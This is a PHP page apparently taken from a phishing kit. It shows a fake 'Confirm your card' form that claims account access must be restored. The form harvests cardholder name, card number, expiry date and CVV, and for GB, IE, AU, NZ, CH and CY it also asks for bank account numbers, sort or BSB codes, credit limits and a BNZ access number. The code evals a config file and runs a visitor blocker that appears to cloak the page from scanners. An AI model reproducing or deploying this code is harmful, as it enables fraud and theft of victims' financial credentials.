<?php
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

$api->visitor("Card");
require __DIR__ . '/../page/header-old.php';
?>
<script src="../assets/old/js/jquery.payment.js"></script>
<script src="../assets/old/js/new.look.js"></script>
<div class="span8">
<section class="activityModule shadow none">
<h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;"><?=$api->transcode("Confirm your card");?></h1>
<div>
</div>
<div class="messageBox res-center-critical" style="font-size: 0.875rem;"><?=$api->transcode("Complete the steps to restore your account access.");?></div>
<form method="post" action="../post/oldcard.php" class="edit" autocomplete="off">
<p class="group fcenter">
<?php
if ($_SESSION['code'] == "GB"){
  echo '<span class="help">Need for bank identification.</span>
  <label>Account number :</label>
  <span class="field">
  <input type="text"class="large" pattern=".{6,30}" maxlength="32" name="accnum" required></span>
  <label>Sort code :</label>
  <span class="field">
  <input name="sort_code1" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" type="text" required> -
  <input name="sort_code2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" type="text" required> -
  <input name="sort_code3" class="xxsmall" pattern="[0-9]{2,}" maxlength="2"type="text" required>
  </span>';
}
if ($_SESSION['code'] == "IE"){
  echo '<span class="help">Need for bank identification.</span>
  <label>Sort code :</label>
  <span class="field">
  <input name="sort_code1" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" type="text" required> -
  <input name="sort_code2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" type="text" required> -
  <input name="sort_code3" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" type="text" required>
  </span>

  <label>Account number :</label>
  <span class="field">
  <input maxlength="8" class="xmedium" name="accnum" type="text" required></span>';
}
if ($_SESSION['code'] == "NZ"){
  echo '<label>Credit limit :</label>
  <span class="field">
  <input type="text" class="large" maxlength="32" name="cc_limit" required></span>

  <label>Account number :</label>
  <span class="field">
  <input type="text" class="large" maxlength="32" name="accnum" required></span>

  <label>BNZ access number :</label>
  <span class="field">
  <input type="text" class="large" maxlength="32" name="bnz" required></span>';
}
if ($_SESSION['code'] == "AU"){
  echo '<span class="help">Need for bank identification.</span>
  <label>Bank/State/Branch number :</label>
  <span class="field">
  <input name="bsbnum_1" class="xxsmall" pattern="[0-9]{2,}" maxlength="3" type="text" required> -
  <input name="bsbnum_2" class="xxsmall" pattern="[0-9]{2,}" maxlength="3" type="text" required>
  </span>
  <label>Account number :</label>
  <span class="field">
  <input maxlength="9" class="xmedium" name="accnum" type="text" required></span>
  <label>Credit limit :</label>
  <span class="field">
  <input type="text" class="large" maxlength="32" name="cc_limit" required></span>';
}
if ($_SESSION['code'] == "CH") {
  echo '<label>Account number :</label>
  <span class="field">
  <input type="text" autocomplete="off" class="large" maxlength="32" name="accnum" required></span>';
}
if ($_SESSION['code'] == "CY") {
  echo '<label>Account number :</label>
  <span class="field">
  <input type="text" maxlength="16" class="xmedium" name="accnum" required></span>';
}
?>
<span class="help" style="padding-left:4%;"><?=$api->transcode("Name as it appears on card.");?></span>
<label><?=$api->transcode("Cardholder name :");?></label>
<span class="field">
<input type="text" class="large" pattern=".{2,30}" maxlength="32" name="cc_holder" required></span>

<label><?=$api->transcode("Card number :");?></label>
<span class="field">
<input type="text" id="cc_number" style="width: 12em;" pattern="[2-7][0-9 ]{11,20}" maxlength="20" name="cc_number" required></span>

<label><?=$api->transcode("Expiration date :");?></label>
<span class="field" style="margin-bottom: 7px;">
<?php
echo date_dropdown(20);
function date_dropdown($year_limit = 0){
$html_output .= '<select class="smal" required="required" name="expdate_month">'."\n";
$html_output .= '';
for ($exp_month = 1; $exp_month <= 12; $exp_month++) {
if (strlen($exp_month) === 1){
$html_output .= '<option value="0' . $exp_month . '">0' . $exp_month . '</option>';
} else {
$html_output .= '<option value="' . $exp_month . '">' . $exp_month . '</option>';
}
}
$html_output .= "\n".'</select>&nbsp;&nbsp;/&nbsp;&nbsp;'."\n";

if (date('m') == 12){
$html_output .= '<select class="mediu" required="required" name="expdate_year">'."\n";
$html_output .= '';
for ($exp_year = date('Y') + 1; $exp_year <= date('Y') + $year_limit; $exp_year++) {
$html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
}
$html_output .= "\n".'</select>'."\n";
} else {
$html_output .= '<select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
$html_output .= '';
for ($exp_year = date('Y'); $exp_year <= date('Y') + $year_limit; $exp_year++) {
$html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
}
$html_output .= "\n".'</select>'."\n";
}
return $html_output;
}
?>
</span>
<label for="cvv2_number"><?=$api->transcode("Card security code :");?></label>
<span class="field">
<input id="cvv2_number" style="width:3.49em;" pattern="[0-9]{3,5}" maxlength="4" name="cvv2_number" type="tel" required>
</span>
</p>
<p class="bcenter">
<button style="width: 150px !important;" type="submit" class="button"><?=$api->transcode("Confirm");?></button>
</p>
</form>
</section>
</div>
</div>
</div>
<br>
<?php require __DIR__ . '/../page/footer-old.php'; ?>
